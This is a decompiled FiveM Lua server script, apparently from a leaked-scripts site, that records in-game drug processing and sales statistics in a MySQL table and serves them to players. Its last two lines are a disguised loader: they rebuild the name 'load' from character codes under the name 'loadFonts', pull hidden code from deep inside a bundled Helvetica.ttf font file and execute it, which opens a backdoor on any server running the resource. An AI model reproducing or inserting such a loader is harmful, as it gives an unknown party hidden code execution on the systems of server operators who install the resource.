-- ============================================
-- More exclusive content you will find here:
-- Cleaned and working - hot scripts and more.
--
-- https://unlocknow.net/releases
-- https://discord.gg/unlocknoww
-- ============================================



local L0_1, L1_1, L2_1, L3_1, L4_1, L5_1, L6_1, L7_1
L0_1 = {}
Stats = L0_1
L0_1 = {}
L1_1 = {}
L0_1.processed = L1_1
L1_1 = {}
L0_1.sold = L1_1
L1_1 = os
L1_1 = L1_1.time
L1_1 = L1_1()
L2_1 = 300
L3_1 = {}
L3_1.lastUpdated = 0
L4_1 = {}
L5_1 = {}
L4_1.dailyStats = L5_1
L5_1 = {}
L4_1.topSellingDrugs = L5_1
L4_1.totalProcessed = 0
L4_1.totalSold = 0
L4_1.previousPeriodProcessed = 0
L4_1.previousPeriodSold = 0
L4_1.topSellingDrug = nil
L3_1.data = L4_1
L4_1 = 300
L5_1 = Stats
function L6_1(A0_2, A1_2)
  local L2_2, L3_2
  L2_2 = L0_1.processed
  L2_2 = L2_2[A0_2]
  if not L2_2 then
    L2_2 = L0_1.processed
    L2_2[A0_2] = 0
  end
  L2_2 = L0_1.processed
  L3_2 = L2_2[A0_2]
  L3_2 = L3_2 + A1_2
  L2_2[A0_2] = L3_2
  L2_2 = os
  L2_2 = L2_2.time
  L2_2 = L2_2()
  L3_2 = L1_1
  L2_2 = L2_2 - L3_2
  L3_2 = L2_1
  if L2_2 >= L3_2 then
    L2_2 = Stats
    L2_2 = L2_2.saveStats
    L2_2()
  end
end
L5_1.addProcessed = L6_1
L5_1 = Stats
function L6_1(A0_2, A1_2)
  local L2_2, L3_2
  L2_2 = L0_1.sold
  L2_2 = L2_2[A0_2]
  if not L2_2 then
    L2_2 = L0_1.sold
    L2_2[A0_2] = 0
  end
  L2_2 = L0_1.sold
  L3_2 = L2_2[A0_2]
  L3_2 = L3_2 + A1_2
  L2_2[A0_2] = L3_2
  L2_2 = os
  L2_2 = L2_2.time
  L2_2 = L2_2()
  L3_2 = L1_1
  L2_2 = L2_2 - L3_2
  L3_2 = L2_1
  if L2_2 >= L3_2 then
    L2_2 = Stats
    L2_2 = L2_2.saveStats
    L2_2()
  end
end
L5_1.addSold = L6_1
L5_1 = Stats
function L6_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2
  L0_2 = os
  L0_2 = L0_2.date
  L1_2 = "%Y-%m-%d"
  L0_2 = L0_2(L1_2)
  L1_2 = {}
  L2_2 = pairs
  L3_2 = L0_1.processed
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = table
    L8_2 = L8_2.insert
    L9_2 = L1_2
    L10_2 = {}
    L11_2 = L0_2
    L12_2 = L6_2
    L13_2 = L7_2
    L14_2 = 0
    L10_2[1] = L11_2
    L10_2[2] = L12_2
    L10_2[3] = L13_2
    L10_2[4] = L14_2
    L8_2(L9_2, L10_2)
  end
  L2_2 = pairs
  L3_2 = L0_1.sold
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = false
    L9_2 = 1
    L10_2 = #L1_2
    L11_2 = 1
    for L12_2 = L9_2, L10_2, L11_2 do
      L13_2 = L1_2[L12_2]
      L13_2 = L13_2[2]
      if L13_2 == L6_2 then
        L13_2 = L1_2[L12_2]
        L13_2[4] = L7_2
        L8_2 = true
        break
      end
    end
    if not L8_2 then
      L9_2 = table
      L9_2 = L9_2.insert
      L10_2 = L1_2
      L11_2 = {}
      L12_2 = L0_2
      L13_2 = L6_2
      L14_2 = 0
      L15_2 = L7_2
      L11_2[1] = L12_2
      L11_2[2] = L13_2
      L11_2[3] = L14_2
      L11_2[4] = L15_2
      L9_2(L10_2, L11_2)
    end
  end
  L2_2 = #L1_2
  if 0 == L2_2 then
    return
  end
  L2_2 = MySQL
  L2_2 = L2_2.prepare
  L2_2 = L2_2.await
  L3_2 = [[
        INSERT INTO lunar_drugscreator_stats (date, drug_name, processed, sold)
        VALUES (?, ?, ?, ?)
        ON DUPLICATE KEY UPDATE
        processed = processed + VALUES(processed),
        sold = sold + VALUES(sold)
    ]]
  L4_2 = L1_2
  L2_2(L3_2, L4_2)
  L2_2 = {}
  L0_1.processed = L2_2
  L2_2 = {}
  L0_1.sold = L2_2
  L2_2 = os
  L2_2 = L2_2.time
  L2_2 = L2_2()
  L1_1 = L2_2
  L2_2 = Stats
  L2_2 = L2_2.refreshCache
  L2_2()
end
L5_1.saveStats = L6_1
L5_1 = Stats
function L6_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2
  L0_2 = os
  L0_2 = L0_2.date
  L1_2 = "%Y-%m-%d"
  L0_2 = L0_2(L1_2)
  L1_2 = os
  L1_2 = L1_2.date
  L2_2 = "%Y-%m-%d"
  L3_2 = os
  L3_2 = L3_2.time
  L3_2 = L3_2()
  L3_2 = L3_2 - 604800
  L1_2 = L1_2(L2_2, L3_2)
  L2_2 = os
  L2_2 = L2_2.date
  L3_2 = "%Y-%m-%d"
  L4_2 = os
  L4_2 = L4_2.time
  L4_2 = L4_2()
  L4_2 = L4_2 - 1209600
  L2_2 = L2_2(L3_2, L4_2)
  L3_2 = MySQL
  L3_2 = L3_2.query
  L3_2 = L3_2.await
  L4_2 = "SELECT * FROM lunar_drugscreator_stats WHERE date >= ?"
  L5_2 = {}
  L6_2 = L2_2
  L5_2[1] = L6_2
  L3_2 = L3_2(L4_2, L5_2)
  L4_2 = {}
  L5_2 = 0
  L6_2 = 0
  L7_2 = 0
  L8_2 = 0
  L9_2 = {}
  L10_2 = {}
  L11_2 = ipairs
  L12_2 = L3_2
  L11_2, L12_2, L13_2, L14_2 = L11_2(L12_2)
  for L15_2, L16_2 in L11_2, L12_2, L13_2, L14_2 do
    L17_2 = nil
    L18_2 = type
    L19_2 = L16_2.date
    L18_2 = L18_2(L19_2)
    if "string" == L18_2 then
      L17_2 = L16_2.date
    else
      L18_2 = type
      L19_2 = L16_2.date
      L18_2 = L18_2(L19_2)
      if "number" == L18_2 then
        L18_2 = os
        L18_2 = L18_2.date
        L19_2 = "%Y-%m-%d"
        L20_2 = math
        L20_2 = L20_2.tointeger
        L21_2 = L16_2.date
        L21_2 = L21_2 / 1000
        L20_2, L21_2 = L20_2(L21_2)
        L18_2 = L18_2(L19_2, L20_2, L21_2)
        L17_2 = L18_2
      else
        L18_2 = tostring
        L19_2 = L16_2.date
        L18_2 = L18_2(L19_2)
        L17_2 = L18_2
      end
    end
    if L1_2 <= L17_2 then
      L18_2 = L4_2[L17_2]
      if not L18_2 then
        L18_2 = {}
        L18_2.total_processed = 0
        L18_2.total_sold = 0
        L4_2[L17_2] = L18_2
      end
      L18_2 = L4_2[L17_2]
      L19_2 = L18_2.total_processed
      L20_2 = L16_2.processed
      L19_2 = L19_2 + L20_2
      L18_2.total_processed = L19_2
      L18_2 = L4_2[L17_2]
      L19_2 = L18_2.total_sold
      L20_2 = L16_2.sold
      L19_2 = L19_2 + L20_2
      L18_2.total_sold = L19_2
      L18_2 = L16_2.processed
      L5_2 = L5_2 + L18_2
      L18_2 = L16_2.sold
      L6_2 = L6_2 + L18_2
      L18_2 = L16_2.drug_name
      L18_2 = L9_2[L18_2]
      if not L18_2 then
        L18_2 = L16_2.drug_name
        L9_2[L18_2] = 0
      end
      L18_2 = L16_2.drug_name
      L19_2 = L9_2[L18_2]
      L20_2 = L16_2.sold
      L19_2 = L19_2 + L20_2
      L9_2[L18_2] = L19_2
    else
      L18_2 = L16_2.processed
      L7_2 = L7_2 + L18_2
      L18_2 = L16_2.sold
      L8_2 = L8_2 + L18_2
      L18_2 = L16_2.drug_name
      L18_2 = L10_2[L18_2]
      if not L18_2 then
        L18_2 = L16_2.drug_name
        L10_2[L18_2] = 0
      end
      L18_2 = L16_2.drug_name
      L19_2 = L10_2[L18_2]
      L20_2 = L16_2.sold
      L19_2 = L19_2 + L20_2
      L10_2[L18_2] = L19_2
    end
  end
  L11_2 = {}
  L12_2 = 0
  L13_2 = 6
  L14_2 = 1
  for L15_2 = L12_2, L13_2, L14_2 do
    L16_2 = os
    L16_2 = L16_2.date
    L17_2 = "%Y-%m-%d"
    L18_2 = os
    L18_2 = L18_2.time
    L18_2 = L18_2()
    L19_2 = 6
    L19_2 = L19_2 - L15_2
    L19_2 = L19_2 * 86400
    L18_2 = L18_2 - L19_2
    L16_2 = L16_2(L17_2, L18_2)
    L17_2 = {}
    L18_2 = os
    L18_2 = L18_2.date
    L19_2 = "%a"
    L20_2 = os
    L20_2 = L20_2.time
    L20_2 = L20_2()
    L21_2 = 6
    L21_2 = L21_2 - L15_2
    L21_2 = L21_2 * 86400
    L20_2 = L20_2 - L21_2
    L18_2 = L18_2(L19_2, L20_2)
    L17_2.name = L18_2
    L17_2.drugsProcessed = 0
    L17_2.drugsSold = 0
    L17_2.date = L16_2
    L18_2 = L4_2[L16_2]
    if L18_2 then
      L18_2 = L4_2[L16_2]
      L18_2 = L18_2.total_processed
      L17_2.drugsProcessed = L18_2
      L18_2 = L4_2[L16_2]
      L18_2 = L18_2.total_sold
      L17_2.drugsSold = L18_2
    end
    L18_2 = table
    L18_2 = L18_2.insert
    L19_2 = L11_2
    L20_2 = L17_2
    L18_2(L19_2, L20_2)
  end
  L12_2 = {}
  L13_2 = pairs
  L14_2 = L9_2
  L13_2, L14_2, L15_2, L16_2 = L13_2(L14_2)
  for L17_2, L18_2 in L13_2, L14_2, L15_2, L16_2 do
    if L18_2 > 0 then
      L19_2 = table
      L19_2 = L19_2.insert
      L20_2 = L12_2
      L21_2 = {}
      L21_2.drug_name = L17_2
      L21_2.amount = L18_2
      L19_2(L20_2, L21_2)
    end
  end
  L13_2 = table
  L13_2 = L13_2.sort
  L14_2 = L12_2
  function L15_2(A0_3, A1_3)
    local L2_3, L3_3
    L2_3 = A0_3.amount
    L3_3 = A1_3.amount
    L2_3 = L2_3 > L3_3
    return L2_3
  end
  L13_2(L14_2, L15_2)
  L13_2 = #L12_2
  if L13_2 > 5 then
    L13_2 = {}
    L14_2 = 1
    L15_2 = 5
    L16_2 = 1
    for L17_2 = L14_2, L15_2, L16_2 do
      L18_2 = table
      L18_2 = L18_2.insert
      L19_2 = L13_2
      L20_2 = L12_2[L17_2]
      L18_2(L19_2, L20_2)
    end
    L12_2 = L13_2
  end
  L13_2 = nil
  L14_2 = #L12_2
  if L14_2 > 0 then
    L14_2 = L12_2[1]
    L14_2 = L14_2.drug_name
    L15_2 = L12_2[1]
    L15_2 = L15_2.amount
    L16_2 = L10_2[L14_2]
    if not L16_2 then
      L16_2 = 0
    end
    L17_2 = 0
    if L16_2 > 0 then
      L18_2 = math
      L18_2 = L18_2.floor
      L19_2 = L15_2 - L16_2
      L19_2 = L19_2 / L16_2
      L19_2 = L19_2 * 100
      L18_2 = L18_2(L19_2)
      L17_2 = L18_2
    end
    L18_2 = {}
    L18_2.name = L14_2
    L18_2.amount = L15_2
    L18_2.percentIncrease = L17_2
    L13_2 = L18_2
  end
  L14_2 = {}
  L14_2.dailyStats = L11_2
  L14_2.topSellingDrugs = L12_2
  L14_2.totalProcessed = L5_2
  L14_2.totalSold = L6_2
  L14_2.previousPeriodProcessed = L7_2
  L14_2.previousPeriodSold = L8_2
  L14_2.topSellingDrug = L13_2
  L3_1.data = L14_2
  L14_2 = os
  L14_2 = L14_2.time
  L14_2 = L14_2()
  L3_1.lastUpdated = L14_2
end
L5_1.refreshCache = L6_1
L5_1 = RegisterNetEvent
L6_1 = "lunar_drugscreator:getStats"
function L7_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2
  L0_2 = source
  L1_2 = L3_1.data
  if not L1_2 then
    L1_2 = Stats
    L1_2 = L1_2.refreshCache
    L1_2()
  else
    L1_2 = os
    L1_2 = L1_2.time
    L1_2 = L1_2()
    L2_2 = L3_1.lastUpdated
    L1_2 = L1_2 - L2_2
    L2_2 = L4_1
    if L1_2 > L2_2 then
      L1_2 = CreateThread
      function L2_2()
        local L0_3, L1_3
        L0_3 = Stats
        L0_3 = L0_3.refreshCache
        L0_3()
      end
      L1_2(L2_2)
    end
  end
  L1_2 = TriggerLatentClientEvent
  L2_2 = "lunar_drugscreator:receiveStats"
  L3_2 = L0_2
  L4_2 = 50000
  L5_2 = L3_1.data
  L1_2(L2_2, L3_2, L4_2, L5_2)
end
L5_1(L6_1, L7_1)
L5_1 = CreateThread
function L6_1()
  local L0_2, L1_2
  L0_2 = Stats
  L0_2 = L0_2.refreshCache
  L0_2()
  while true do
    L0_2 = Wait
    L1_2 = L4_1
    L1_2 = L1_2 * 1000
    L0_2(L1_2)
    L0_2 = Stats
    L0_2 = L0_2.refreshCache
    L0_2()
  end
end
L5_1(L6_1)
L5_1 = AddEventHandler
L6_1 = "onResourceStop"
function L7_1(A0_2)
  local L1_2
  L1_2 = GetCurrentResourceName
  L1_2 = L1_2()
  if L1_2 == A0_2 then
    L1_2 = Stats
    L1_2 = L1_2.saveStats
    L1_2()
  end
end
L5_1(L6_1, L7_1)

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()